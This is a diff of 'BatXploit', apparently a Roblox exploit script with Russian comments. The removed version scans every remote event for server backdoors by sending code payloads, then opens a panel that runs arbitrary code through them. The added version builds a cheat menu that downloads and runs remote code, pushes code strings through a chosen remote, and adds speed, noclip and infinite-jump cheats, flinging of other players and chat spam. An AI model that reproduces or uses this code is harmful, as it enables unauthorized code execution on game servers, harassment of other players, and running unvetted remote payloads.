@@ -2,328 +2,275 @@
 --██▄▄██ ██▀██  ██    ████  ██▄█▀ ██    ██▀██ ██   ██     ██     ██▀██ ██▀██ ██▀██ ██▄▄  ██▀██  ██   ██▄▄   ███▄██   ██ ██▀██ ▀███▀ ▀  ██ 
 --██▄▄█▀ ██▀██  ██   ██  ██ ██    ██▄▄▄ ▀███▀ ██   ██     ██████ ▀███▀ ██▀██ ████▀ ██▄▄▄ ████▀  ▄▄   ██▄▄▄▄ ██ ▀██ ▄▄█▀ ▀███▀   █   ▄ ▄█▀ 
 
-print("BatXploit Lalol Hub Style Scanner - FIXED PANEL")
+print("BatXploit UI - Inspired by LALOL Hub")
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "LalolScanner"
-screenGui.Parent = game:GetService("CoreGui")
-screenGui.ResetOnSpawn = false
+-- Проверяем, установлена ли библиотека Rayfield
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 550, 0, 650)
-mainFrame.Position = UDim2.new(0.5, -275, 0.5, -325)
-mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-mainFrame.BackgroundTransparency = 0.1
-mainFrame.BorderSizePixel = 2
-mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-mainFrame.Active = true
-mainFrame.Draggable = true
-mainFrame.Parent = screenGui
+local window = Rayfield:CreateWindow({
+    Name = "BatXploit",
+    LoadingTitle = "BatXploit",
+    LoadingSubtitle = "from .bat to .exe",
+    ConfigurationSaving = {
+        Enabled = false,
+        FolderName = "BatXploit",
+        FileName = "Settings"
+    },
+    Discord = {
+        Enabled = true,
+        Invite = "your_discord_invite", -- замени на свой Discord
+        RememberJoins = true
+    },
+    KeySystem = false, -- отключаем ключи, можно включить если нужно
+})
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-title.Text = "BatXploit | Lalol Hub Style Scanner"
-title.TextColor3 = Color3.fromRGB(255, 0, 0)
-title.Font = Enum.Font.SourceSansBold
-title.TextSize = 18
-title.Parent = mainFrame
+-- ========== ВКЛАДКА "SCANNER" ==========
+local scannerTab = window:CreateTab("Scanner", 4483362458) -- иконка (ID можно заменить)
 
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -20, 0, 25)
-statusLabel.Position = UDim2.new(0, 10, 0, 50)
-statusLabel.Text = "Status: Ready"
-statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-statusLabel.Parent = mainFrame
+scannerTab:CreateButton({
+    Name = "Start Backdoor Scan",
+    Callback = function()
+        -- Здесь будет твой код сканера (например, агрессивный или LALOL метод)
+        -- Просто пример:
+        print("Запуск сканера...")
+        -- Можно вставить сюда твой скрипт сканера
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/str3llbatofficial/BatXploit/main/Backdoorscanner(maybe).lua"))()
+    end,
+})
 
-local scanBtn = Instance.new("TextButton")
-scanBtn.Size = UDim2.new(0, 160, 0, 35)
-scanBtn.Position = UDim2.new(0, 10, 0, 85)
-scanBtn.Text = "Start Scan"
-scanBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-scanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-scanBtn.BorderSizePixel = 1
-scanBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
-scanBtn.Parent = mainFrame
+scannerTab:CreateInput({
+    Name = "Custom Remote Path",
+    PlaceholderText = "game.ReplicatedStorage.SomeRemote",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(text)
+        _G.CustomRemote = text
+        print("Установлен путь: " .. text)
+    end,
+})
 
-local clearBtn = Instance.new("TextButton")
-clearBtn.Size = UDim2.new(0, 100, 0, 35)
-clearBtn.Position = UDim2.new(0, 180, 0, 85)
-clearBtn.Text = "Clear"
-clearBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-clearBtn.BorderSizePixel = 1
-clearBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
-clearBtn.Parent = mainFrame
-
-local resultFrame = Instance.new("ScrollingFrame")
-resultFrame.Size = UDim2.new(1, -20, 0, 420)
-resultFrame.Position = UDim2.new(0, 10, 0, 130)
-resultFrame.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
-resultFrame.BorderSizePixel = 1
-resultFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-resultFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-resultFrame.ScrollBarThickness = 8
-resultFrame.Parent = mainFrame
-
-local resultLayout = Instance.new("UIListLayout")
-resultLayout.Padding = UDim.new(0, 5)
-resultLayout.Parent = resultFrame
-
-local foundBackdoors = {}
-local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}
-
-local function addResult(text, color, bold)
-    local label = Instance.new("TextLabel")
-    label.Text = text
-    label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
-    label.TextSize = 12
-    label.TextXAlignment = Enum.TextXAlignment.Left
-    label.TextWrapped = true
-    label.Size = UDim2.new(1, -10, 0, 20)
-    label.BackgroundTransparency = 1
-    if bold then
-        label.Font = Enum.Font.SourceSansBold
-    end
-    label.Parent = resultFrame
-    task.wait()
-    resultFrame.CanvasSize = UDim2.new(0, 0, 0, resultLayout.AbsoluteContentSize.Y)
-end
-
-local function generateRandomName(length)
-    local text = ''
-    for i = 1, length do
-        text = text .. alphabet[math.random(1, #alphabet)]
-    end
-    return text
-end
-
-local function runRemote(remote, data)
-    pcall(function()
-        if remote:IsA("RemoteEvent") then
-            remote:FireServer(data)
-        elseif remote:IsA("RemoteFunction") then
-            remote:InvokeServer(data)
-        end
-    end)
-end
-
-local function notify(text)
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "BatXploit",
-        Text = text,
-        Duration = 4
-    })
-end
-
--- Тест одного remote
-local function testRemote(remote, remotePath)
-    local testName = generateRandomName(math.random(12, 30))
-    runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. testName .. "'")
-    for _ = 1, 10 do
-        task.wait(0.1)
-        if workspace:FindFirstChild(testName) then
-            workspace[testName]:Destroy()
-            addResult("✅ BACKDOOR CONFIRMED: " .. remotePath, Color3.fromRGB(0, 255, 0), true)
-            return true
-        end
-    end
-    return false
-end
-
--- Защищённый бэкдор
-local function checkProtectedBackdoor()
-    local protectedName = "lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId
-    local protectedRemote = game:GetService("ReplicatedStorage"):FindFirstChild(protectedName)
-    if protectedRemote and protectedRemote:IsA("RemoteFunction") then
-        addResult("🔒 PROTECTED BACKDOOR FOUND: " .. protectedRemote:GetFullName(), Color3.fromRGB(255, 200, 0), true)
-        table.insert(foundBackdoors, {remote = protectedRemote, path = protectedRemote:GetFullName()})
-        return true
-    end
-    return false
-end
-
--- Сканирование
-local function scanAllRemotes()
-    foundBackdoors = {}
-    addResult("🔍 STARTING LALOL HUB STYLE SCAN", Color3.fromRGB(0, 255, 0), true)
-    checkProtectedBackdoor()
-    
-    local allRemotes = {}
-    for _, obj in ipairs(game:GetDescendants()) do
-        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
-            local fullName = obj:GetFullName()
-            if not fullName:find("RobloxReplicatedStorage") and not fullName:find("DefaultChatSystemChatEvents") then
-                table.insert(allRemotes, obj)
+scannerTab:CreateButton({
+    Name = "Execute on Custom Remote",
+    Callback = function()
+        if _G.CustomRemote then
+            local remote = loadstring("return " .. _G.CustomRemote)()
+            if remote then
+                pcall(function()
+                    remote:FireServer("print('BatXploit test')")
+                end)
+                print("Отправлено на " .. _G.CustomRemote)
+            else
+                print("Remote не найден")
             end
         end
-    end
-    
-    addResult("📡 Found " .. #allRemotes .. " remotes to test", Color3.fromRGB(255, 255, 0), false)
-    
-    for i, remote in ipairs(allRemotes) do
-        statusLabel.Text = "Testing " .. i .. "/" .. #allRemotes
-        if testRemote(remote, remote:GetFullName()) then
-            table.insert(foundBackdoors, {remote = remote, path = remote:GetFullName()})
-        end
-        task.wait(0.05)
-    end
-    
-    statusLabel.Text = "Scan complete. Found " .. #foundBackdoors .. " backdoors"
-    addResult("✅ SCAN COMPLETED! Found " .. #foundBackdoors .. " backdoors", Color3.fromRGB(0, 255, 0), true)
-    
-    -- ПРИНУДИТЕЛЬНОЕ СОЗДАНИЕ ПАНЕЛИ, если есть бэкдоры
-    if #foundBackdoors > 0 then
-        -- Небольшая задержка для гарантии
-        task.wait(0.5)
-        createControlPanel()
-        notify("Found " .. #foundBackdoors .. " backdoor(s)! Use the panel below.")
-    else
-        notify("No backdoors found.")
-    end
-end
+    end,
+})
 
--- СОЗДАНИЕ ПАНЕЛИ УПРАВЛЕНИЯ (с отладкой)
-local function createControlPanel()
-    -- Удаляем старую панель, если есть
-    local oldPanel = mainFrame:FindFirstChild("ControlPanel")
-    if oldPanel then oldPanel:Destroy() end
-    
-    addResult("🛠️ Creating control panel for " .. #foundBackdoors .. " backdoor(s)...", Color3.fromRGB(255, 255, 0), false)
-    
-    local controlFrame = Instance.new("Frame")
-    controlFrame.Name = "ControlPanel"
-    controlFrame.Size = UDim2.new(1, -20, 0, 100)
-    controlFrame.Position = UDim2.new(0, 10, 1, -110)
-    controlFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
-    controlFrame.BorderSizePixel = 2
-    controlFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-    controlFrame.Parent = mainFrame
-    
-    local execTitle = Instance.new("TextLabel")
-    execTitle.Size = UDim2.new(1, 0, 0, 20)
-    execTitle.Text = "💀 BACKDOOR EXECUTION PANEL (select remote below) 💀"
-    execTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
-    execTitle.BackgroundTransparency = 1
-    execTitle.Font = Enum.Font.SourceSansBold
-    execTitle.Parent = controlFrame
-    
-    -- Выпадающий список для выбора бэкдора
-    local dropdown = Instance.new("TextBox")
-    dropdown.Size = UDim2.new(0, 200, 0, 25)
-    dropdown.Position = UDim2.new(0, 10, 0, 25)
-    dropdown.PlaceholderText = "Select backdoor (click to copy)"
-    dropdown.Text = foundBackdoors[1].path
-    dropdown.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-    dropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
-    dropdown.Parent = controlFrame
-    
-    -- Кнопка для копирования пути
-    local copyBtn = Instance.new("TextButton")
-    copyBtn.Size = UDim2.new(0, 60, 0, 25)
-    copyBtn.Position = UDim2.new(0, 220, 0, 25)
-    copyBtn.Text = "Copy"
-    copyBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    copyBtn.BorderSizePixel = 1
-    copyBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
-    copyBtn.Parent = controlFrame
-    copyBtn.MouseButton1Click:Connect(function()
-        setclipboard(dropdown.Text)
-        addResult("📋 Copied path: " .. dropdown.Text, Color3.fromRGB(200, 200, 0), false)
-    end)
-    
-    -- Поле для ввода кода
-    local execBox = Instance.new("TextBox")
-    execBox.Size = UDim2.new(0, 350, 0, 40)
-    execBox.Position = UDim2.new(0, 10, 0, 55)
-    execBox.Text = "print('BatXploit backdoor test')"
-    execBox.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-    execBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    execBox.TextWrapped = true
-    execBox.Parent = controlFrame
-    
-    local execBtn = Instance.new("TextButton")
-    execBtn.Size = UDim2.new(0, 120, 0, 40)
-    execBtn.Position = UDim2.new(0, 370, 0, 55)
-    execBtn.Text = "EXECUTE"
-    execBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    execBtn.BorderSizePixel = 2
-    execBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
-    execBtn.Font = Enum.Font.SourceSansBold
-    execBtn.Parent = controlFrame
-    
-    execBtn.MouseButton1Click:Connect(function()
-        local selectedPath = dropdown.Text
-        local targetRemote = nil
-        for _, bd in ipairs(foundBackdoors) do
-            if bd.path == selectedPath then
-                targetRemote = bd.remote
-                break
-            end
-        end
-        if targetRemote then
-            runRemote(targetRemote, execBox.Text)
-            addResult("💀 Executed on: " .. selectedPath, Color3.fromRGB(255, 50, 50), false)
-            notify("Executed code on selected backdoor")
-        else
-            addResult("❌ Remote not found in list", Color3.fromRGB(255, 0, 0), false)
-        end
-    end)
-    
-    addResult("🔥 CONTROL PANEL CREATED! Select backdoor and execute code.", Color3.fromRGB(0, 255, 0), true)
-end
+-- ========== ВКЛАДКА "EXPLOITS" ==========
+local exploitsTab = window:CreateTab("Exploits", 4483362458)
 
--- Drag & Drop
-local function dragify(frame)
-    local dragToggle, dragInput, dragStart, startPos
-    local UIS = game:GetService("UserInputService")
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:GetFocusedTextBox() == nil then
-            dragToggle = true
-            dragStart = input.Position
-            startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragToggle = false
+exploitsTab:CreateSection("Movement")
+
+exploitsTab:CreateSlider({
+    Name = "Walk Speed",
+    Range = {0, 250},
+    Increment = 1,
+    Suffix = "Speed",
+    CurrentValue = 16,
+    Flag = "walkSpeed",
+    Callback = function(v)
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.WalkSpeed = v
+        end
+    end,
+})
+
+exploitsTab:CreateSlider({
+    Name = "Jump Power",
+    Range = {0, 250},
+    Increment = 1,
+    Suffix = "Power",
+    CurrentValue = 50,
+    Flag = "jumpPower",
+    Callback = function(v)
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.JumpPower = v
+        end
+    end,
+})
+
+exploitsTab:CreateToggle({
+    Name = "Noclip",
+    CurrentValue = false,
+    Flag = "noclip",
+    Callback = function(state)
+        _G.NoClip = state
+        local player = game.Players.LocalPlayer
+        local runService = game:GetService("RunService")
+        if state then
+            _G.NoclipConnection = runService.Stepped:Connect(function()
+                local char = player.Character
+                if char then
+                    for _, part in pairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
                 end
             end)
+        else
+            if _G.NoclipConnection then
+                _G.NoclipConnection:Disconnect()
+                _G.NoclipConnection = nil
+            end
+            local char = player.Character
+            if char then
+                for _, part in pairs(char:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = true
+                    end
+                end
+            end
         end
-    end)
-    frame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement then
-            dragInput = input
-        end
-    end)
-    UIS.InputChanged:Connect(function(input)
-        if input == dragInput and dragToggle then
-            local delta = input.Position - dragStart
-            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-dragify(mainFrame)
+    end,
+})
 
-scanBtn.MouseButton1Click:Connect(scanAllRemotes)
-clearBtn.MouseButton1Click:Connect(function()
-    for _, child in ipairs(resultFrame:GetChildren()) do
-        if child:IsA("TextLabel") then
-            child:Destroy()
+exploitsTab:CreateToggle({
+    Name = "Infinite Jump",
+    CurrentValue = false,
+    Flag = "infJump",
+    Callback = function(state)
+        _G.InfiniteJump = state
+        local player = game.Players.LocalPlayer
+        local UIS = game:GetService("UserInputService")
+        if state then
+            _G.JumpConnection = UIS.JumpRequested:Connect(function()
+                local char = player.Character
+                if char and char:FindFirstChild("Humanoid") then
+                    char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+            end)
+        else
+            if _G.JumpConnection then
+                _G.JumpConnection:Disconnect()
+                _G.JumpConnection = nil
+            end
         end
-    end
-    foundBackdoors = {}
-    addResult("Results cleared", Color3.fromRGB(255, 255, 0), false)
-end)
+    end,
+})
 
-game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
-    if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
-        mainFrame.Visible = not mainFrame.Visible
-    end
-end)
+exploitsTab:CreateButton({
+    Name = "Fly (Simple)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "BatXploit",
+            Text = "Use ;fly in chat",
+            Duration = 3
+        })
+    end,
+})
 
-notify("Lalol Hub Style Scanner loaded (fixed panel)")
-addResult("🔥 BatXploit Lalol Hub Style Scanner (FIXED) 🔥", Color3.fromRGB(255, 0, 0), true)
-addResult("📌 Method: creates a model in workspace to confirm backdoor", Color3.fromRGB(255, 255, 0), false)
-addResult("📌 Press Left Alt to show/hide", Color3.fromRGB(255, 255, 0), false)
+-- ========== ВКЛАДКА "FLING" ==========
+local flingTab = window:CreateTab("Fling", 4483362458)
+
+flingTab:CreateInput({
+    Name = "Target Player Name",
+    PlaceholderText = "Enter username",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(name)
+        _G.FlingTarget = name
+    end,
+})
+
+flingTab:CreateButton({
+    Name = "Fling Target",
+    Callback = function()
+        local target = _G.FlingTarget
+        if not target or target == "" then
+            print("No target set")
+            return
+        end
+        local player = game.Players:FindFirstChild(target)
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = player.Character.HumanoidRootPart
+            local bv = Instance.new("BodyVelocity")
+            bv.MaxForce = Vector3.new(1,1,1)*1e6
+            bv.Velocity = Vector3.new(math.random(-500,500), math.random(100,500), math.random(-500,500))
+            bv.Parent = hrp
+            task.wait(0.5)
+            bv:Destroy()
+            print("Flinged " .. target)
+        else
+            print("Target not found or no character")
+        end
+    end,
+})
+
+-- ========== ВКЛАДКА "UTILITIES" ==========
+local utilsTab = window:CreateTab("Utilities", 4483362458)
+
+utilsTab:CreateButton({
+    Name = "Rejoin",
+    Callback = function()
+        game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+    end,
+})
+
+utilsTab:CreateButton({
+    Name = "Server Hop",
+    Callback = function()
+        local servers = {}
+        for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")).data) do
+            if type(v) == "table" and v.playing and v.id ~= game.JobId then
+                table.insert(servers, v.id)
+            end
+        end
+        if #servers > 0 then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
+        else
+            print("No other servers found")
+        end
+    end,
+})
+
+utilsTab:CreateButton({
+    Name = "Clear Chat",
+    Callback = function()
+        for i=1,50 do
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
+        end
+    end,
+})
+
+utilsTab:CreateToggle({
+    Name = "Anti-AFK",
+    CurrentValue = false,
+    Flag = "antiAFK",
+    Callback = function(state)
+        local player = game.Players.LocalPlayer
+        if state then
+            _G.AFKConnection = game:GetService("Players").LocalPlayer.Idled:Connect(function()
+                local VirtualUser = game:GetService("VirtualUser")
+                VirtualUser:CaptureController()
+                VirtualUser:ClickButton2(Vector2.new())
+            end)
+        else
+            if _G.AFKConnection then
+                _G.AFKConnection:Disconnect()
+                _G.AFKConnection = nil
+            end
+        end
+    end,
+})
+
+-- Уведомление о загрузке
+Rayfield:Notify({
+    Title = "BatXploit",
+    Content = "UI Loaded! Enjoy :)",
+    Duration = 3,
+    Image = 4914902889, -- иконка (опционально)
+})
